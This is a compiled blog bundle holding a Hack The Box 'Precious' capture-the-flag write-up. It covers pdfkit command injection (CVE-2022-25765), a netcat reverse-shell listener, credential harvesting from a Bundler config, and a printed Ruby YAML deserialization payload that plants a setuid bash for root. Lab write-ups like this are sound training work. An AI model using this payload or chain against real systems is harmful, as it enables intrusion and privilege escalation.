"use strict";(self.webpackChunkmy_blog=self.webpackChunkmy_blog||[]).push([[807],{2137:(e,t,n)=>{n.d(t,{A:()=>s});const s=n.p+"assets/images/image-pr-23-6c6579380afab0d389ca60168220cd88.png"},2647:(e,t,n)=>{n.d(t,{A:()=>s});const s=n.p+"assets/images/image-pr-14-2e091da2a07a41b03e9f1fe21dda3673.png"},2898:(e,t,n)=>{n.d(t,{A:()=>s});const s=n.p+"assets/images/image-pr-19-551c3003bf2df461320e57f04e7ff733.png"},3824:(e,t,n)=>{n.r(t),n.d(t,{assets:()=>h,contentTitle:()=>d,default:()=>l,frontMatter:()=>a,metadata:()=>s,toc:()=>o});var s=n(6204),i=n(4848),r=n(8453);const a={title:"Precious",date:new Date("2025-05-24T00:00:00.000Z")},d=void 0,h={authorsImageUrls:[]},o=[{value:"Task 1",id:"task-1",level:3},{value:"Task 2",id:"task-2",level:3},{value:"Task 3",id:"task-3",level:3},{value:"Task 4",id:"task-4",level:3},{value:"Task 5",id:"task-5",level:3},{value:"Task 6",id:"task-6",level:3},{value:"Task 7",id:"task-7",level:3},{value:"Task 8",id:"task-8",level:3},{value:"Task 9",id:"task-9",level:3}];function c(e){const t={a:"a",code:"code",h3:"h3",img:"img",p:"p",pre:"pre",...(0,r.R)(),...e.components};return(0,i.jsxs)(i.Fragment,{children:[(0,i.jsx)(t.h3,{id:"task-1",children:"Task 1"}),"\n",(0,i.jsx)(t.p,{children:"Nginx is running with what additional software designed to serve web applications?"}),"\n",(0,i.jsxs)(t.p,{children:["Navigating to the target IP address we are being redirected to the domain ",(0,i.jsx)(t.code,{children:"precious.htb"}),". We then add it to the hosts file ",(0,i.jsx)(t.code,{children:"vim /etc/hosts"})," and reload the page."]}),"\n",(0,i.jsx)(t.p,{children:(0,i.jsx)(t.img,{alt:"alt text",src:n(2647).A+"",width:"1264",height:"362"})}),"\n",(0,i.jsx)(t.p,{children:"After reloading the page, we see that the website's usage is converting web page to pdf."}),"\n",(0,i.jsx)(t.p,{children:(0,i.jsx)(t.img,{alt:"alt text",src:n(7070).A+"",width:"1614",height:"752"})}),"\n",(0,i.jsxs)(t.p,{children:["We then run ",(0,i.jsx)(t.code,{children:"whatweb <target_url> -v"})," and find that additional to nginx web server, the software running is Phusion Passenger."]}),"\n",(0,i.jsx)(t.p,{children:(0,i.jsx)(t.img,{alt:"alt text",src:n(7429).A+"",width:"1614",height:"328"})}),"\n",(0,i.jsx)(t.h3,{id:"task-2",children:"Task 2"}),"\n",(0,i.jsx)(t.p,{children:"Which HTTP response header reveals the underlying scripting Language of the web application?"}),"\n",(0,i.jsxs)(t.p,{children:["From the same response of ",(0,i.jsx)(t.code,{children:"whatweb"}),", we see the HTTP response header that specifies the scripting language."]}),"\n",(0,i.jsx)(t.p,{children:(0,i.jsx)(t.img,{alt:"alt text",src:n(4540).A+"",width:"1212",height:"722"})}),"\n",(0,i.jsx)(t.h3,{id:"task-3",children:"Task 3"}),"\n",(0,i.jsx)(t.p,{children:"Which Ruby library are the PDF documents generated with?"}),"\n",(0,i.jsx)(t.p,{children:"Providing a public url to be converted, we can the error Cannot load remote URL."}),"\n",(0,i.jsx)(t.p,{children:(0,i.jsx)(t.img,{alt:"alt text",src:n(4027).A+"",width:"1606",height:"532"})}),"\n",(0,i.jsxs)(t.p,{children:["Instead, we start a Python HTTP server by running ",(0,i.jsx)(t.code,{children:"python3 -m http.server 8080"}),". Then we can provide the IP address of the host machine to be converted as ",(0,i.jsx)(t.code,{children:"http://<host_ip>:8080"})," and get a pdf file back."]}),"\n",(0,i.jsxs)(t.p,{children:["Running ",(0,i.jsx)(t.code,{children:"exiftool"})," against the pdf file we get the information we need about the Ruby library."]}),"\n",(0,i.jsx)(t.p,{children:(0,i.jsx)(t.img,{alt:"alt text",src:n(2898).A+"",width:"1644",height:"760"})}),"\n",(0,i.jsx)(t.h3,{id:"task-4",children:"Task 4"}),"\n",(0,i.jsx)(t.p,{children:"Which 2022 CVE applies to that specific version of pdfkit?"}),"\n",(0,i.jsx)(t.p,{children:"By a quick google search we can find the CVE ID 2022-25765 of the Command Injection vulnerability."}),"\n",(0,i.jsx)(t.h3,{id:"task-5",children:"Task 5"}),"\n",(0,i.jsx)(t.p,{children:"Which directory located in the running user's home directory is used by Bundler to store configuration files?"}),"\n",(0,i.jsxs)(t.p,{children:["Using a PoC for the CVE that can be found at ",(0,i.jsx)(t.a,{href:"https://github.com/shamo0/PDFkit-CMD-Injection",children:"text"}),", we start a python server again with the same command ",(0,i.jsx)(t.code,{children:"python3 -m http.server 8080"})," and listener on port 4444 ",(0,i.jsx)(t.code,{children:"nc -lvnp 4444"}),". Then we send the curl exploit and we are connected on the target machine."]}),"\n",(0,i.jsx)(t.p,{children:(0,i.jsx)(t.img,{alt:"alt text",src:n(9202).A+"",width:"1298",height:"302"})}),"\n",(0,i.jsxs)(t.p,{children:["Moving to rubycd home directory and running ",(0,i.jsx)(t.code,{children:"ls -a"})," to list the directories, including the hidden ones, we see the .bundle file that contains the configuration files."]}),"\n",(0,i.jsx)(t.h3,{id:"task-6",children:"Task 6"}),"\n",(0,i.jsx)(t.p,{children:"Sumbit the flag located in the henry user's home directory."}),"\n",(0,i.jsx)(t.p,{children:"Inside the .bundle directory we open the config file and get the credentials for the user henry."}),"\n",(0,i.jsx)(t.p,{children:(0,i.jsx)(t.img,{alt:"alt text",src:n(5888).A+"",width:"1258",height:"162"})}),"\n",(0,i.jsxs)(t.p,{children:["Then, we switch to the henry user by running ",(0,i.jsx)(t.code,{children:"su - henry"})," and provide the password from before. Running ",(0,i.jsx)(t.code,{children:"whoami"})," shows us that we are now user henry."]}),"\n",(0,i.jsxs)(t.p,{children:["After navigating to the henry user's home directory and running ",(0,i.jsx)(t.code,{children:"cat user.txt"})," we get the user flag."]}),"\n",(0,i.jsx)(t.h3,{id:"task-7",children:"Task 7"}),"\n",(0,i.jsx)(t.p,{children:"Which command can henry run with sudo, without providing a password?"}),"\n",(0,i.jsxs)(t.p,{children:["We are now gonna run the ",(0,i.jsx)(t.code,{children:"LinEnum.sh"})," script to enumerate the host. For that purpose, we first get the script on our host machine and then open a Python server on port 8888 on the directory the script is at. Then, on the target machine we run ",(0,i.jsx)(t.code,{children:"wget http://<host_ip>:8888/LinEnum.sh"}),". Looking through the result we see that the user henry can sudo the command ",(0,i.jsx)(t.code,{children:"/usr/bin/ruby /opt/update_dependencies.rb"}),"."]}),"\n",(0,i.jsx)(t.p,{children:(0,i.jsx)(t.img,{alt:"alt text",src:n(2137).A+"",width:"1610",height:"428"})}),"\n",(0,i.jsx)(t.h3,{id:"task-8",children:"Task 8"}),"\n",(0,i.jsx)(t.p,{children:"Which is the name of the file that allows for user-controlled input to the update_dependencies.rb script?"}),"\n",(0,i.jsxs)(t.p,{children:["Opening the file by ",(0,i.jsx)(t.code,{children:" cat /opt/update_dependencies.rb"})," we see that the file used is ",(0,i.jsx)(t.code,{children:"dependencies.yml"}),"."]}),"\n",(0,i.jsx)(t.p,{children:(0,i.jsx)(t.img,{alt:"alt text",src:n(9718).A+"",width:"1610",height:"592"})}),"\n",(0,i.jsx)(t.h3,{id:"task-9",children:"Task 9"}),"\n",(0,i.jsx)(t.p,{children:"Submit the flag located in root's home directory."}),"\n",(0,i.jsxs)(t.p,{children:["First, we inspect the file ",(0,i.jsx)(t.code,{children:"update_dependencies.rb"})," and see that there is an unsafe load of the file that allows for user-controlled input."]}),"\n",(0,i.jsx)(t.pre,{children:(0,i.jsx)(t.code,{children:'def list_from_file\n    YAML.load(File.read("dependencies.yml"))\nend\n'})}),"\n",(0,i.jsxs)(t.p,{children:["The ",(0,i.jsx)(t.code,{children:"YAML.load()"})," deserializes YAML into Ruby objects in an insecure way that can lead to arbitary code execution. Based on this gist ",(0,i.jsx)(t.a,{href:"https://gist.github.com/staaldraad/89dffe369e1454eedd3306edc8a7e565#file-ruby_yaml_load_sploit2-yaml",children:"text"})," we craft the following payload and we place it in the henry's home directory."]}),"\n",(0,i.jsx)(t.pre,{children:(0,i.jsx)(t.code,{children:"\ncat << 'EOF' > dependencies.yml\n--- \n- !ruby/object:Gem::Installer\n  i: x\n- !ruby/object:Gem::SpecFetcher\n  i: y\n- !ruby/object:Gem::Requirement\n  requirements:\n    !ruby/object:Gem::Package::TarReader\n      io: &1 !ruby/object:Net::BufferedIO\n        io: &1 !ruby/object:Gem::Package::TarReader::Entry\n          read: 0\n          header: \"abc\"\n        debug_output: &1 !ruby/object:Net::WriteAdapter\n          socket: &1 !ruby/object:Gem::RequestSet\n            sets: !ruby/object:Net::WriteAdapter\n              socket: !ruby/module 'Kernel'\n              method_id: :system\n            git_set: cp /bin/bash /tmp/dani; chmod +6777 /tmp/dani\n          method_id: :resolve\nEOF\n"})}),"\n",(0,i.jsxs)(t.p,{children:["We run the script as root ",(0,i.jsx)(t.code,{children:"sudo /usr/bin/ruby /opt/update_dependencies.rb"})," that is possible without providing password and then use the command ",(0,i.jsx)(t.code,{children:"/tmp/dani -p"})," which launches a new shell. The ",(0,i.jsx)(t.code,{children:"-p"})," flag tells bash to preserve the effective UID, which is 0 meaning root thanks to the setuid bit of the chmod command. Finally navigating to the ",(0,i.jsx)(t.code,{children:"/root"})," directory and ",(0,i.jsx)(t.code,{children:"cat root.txt"})," gives us the root flag."]})]})}function l(e={}){const{wrapper:t}={...(0,r.R)(),...e.components};return t?(0,i.jsx)(t,{...e,children:(0,i.jsx)(c,{...e})}):c(e)}},4027:(e,t,n)=>{n.d(t,{A:()=>s});const s=n.p+"assets/images/image-pr-18-fe1ad720eba7d8ce6918e47caa16cf62.png"},4540:(e,t,n)=>{n.d(t,{A:()=>s});const s=n.p+"assets/images/image-pr-17-fb2e51f74495059f4807943934bb6c0d.png"},5888:(e,t,n)=>{n.d(t,{A:()=>s});const s=n.p+"assets/images/image-pr-22-8d83a0c85f828786739c0f1a6ecce687.png"},6204:e=>{e.exports=JSON.parse('{"permalink":"/Blog/blog/Precious","editUrl":"https://github.com/danae-pan/Blog/blog/Precious.md","source":"@site/blog/Precious.md","title":"Precious","description":"Task 1","date":"2025-05-24T00:00:00.000Z","tags":[],"readingTime":3.59,"hasTruncateMarker":true,"authors":[],"frontMatter":{"title":"Precious","date":"2025-05-24T00:00:00.000Z"},"unlisted":false,"nextItem":{"title":"Writeup","permalink":"/Blog/blog/Writeup"}}')},7070:(e,t,n)=>{n.d(t,{A:()=>s});const s=n.p+"assets/images/image-pr-15-3865e1fe2f0063cab8d35077043f970a.png"},7429:(e,t,n)=>{n.d(t,{A:()=>s});const s=n.p+"assets/images/image-pr-16-0b38cb81672bdb56d43eb0eadfe3ff7b.png"},8453:(e,t,n)=>{n.d(t,{R:()=>a,x:()=>d});var s=n(6540);const i={},r=s.createContext(i);function a(e){const t=s.useContext(r);return s.useMemo((function(){return"function"==typeof e?e(t):{...t,...e}}),[t,e])}function d(e){let t;return t=e.disableParentContext?"function"==typeof e.components?e.components(i):e.components||i:a(e.components),s.createElement(r.Provider,{value:t},e.children)}},9202:(e,t,n)=>{n.d(t,{A:()=>s});const s=n.p+"assets/images/image-pr-20-e5439a5797113a855d4301fa47b167d1.png"},9718:(e,t,n)=>{n.d(t,{A:()=>s});const s=n.p+"assets/images/image-pr-24-a42e425b826d4b8e17820f2718f332c7.png"}}]);